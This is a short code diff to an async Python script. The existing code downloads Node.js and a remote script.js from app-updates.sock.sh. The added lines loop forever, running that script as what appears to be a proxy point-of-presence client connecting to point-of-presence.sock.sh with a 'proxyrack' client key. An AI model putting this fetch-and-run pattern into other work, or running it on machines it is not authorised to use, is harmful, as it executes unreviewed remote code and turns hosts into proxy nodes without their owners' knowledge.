@@ -30,6 +30,9 @@ async def main():
             for _ in tar.getmembers(): _.name = builtins.str(pathlib.Path('node', *pathlib.Path(_.name).parts[1:]))
             tar.extractall(path=pathlib.Path(__file__).resolve().parent)
         async with client.get('https://app-updates.sock.sh/peerclient/script/script.js') as script: pathlib.Path(__file__).resolve().parent.joinpath('script.js').write_bytes(await script.content.read())
-    await asyncio.Future()
-    
+        while True:
+            async with client.get('https://app-updates.sock.sh/peerclient/script/version.txt') as version:
+                node = await asyncio.create_subprocess_exec(pathlib.Path(__file__).resolve().parent.joinpath('node/bin/node'), pathlib.Path(__file__).resolve().parent.joinpath('script.js'), '--homeIp', 'point-of-presence.sock.sh', '--homePort', '443', '--id', 'galaxycloud.', '--version', await version.text(), '--clientKey', 'proxyrack-pop-client', '--clientType', 'PoP')
+                await node.wait()
+
 uvloop.run(main())
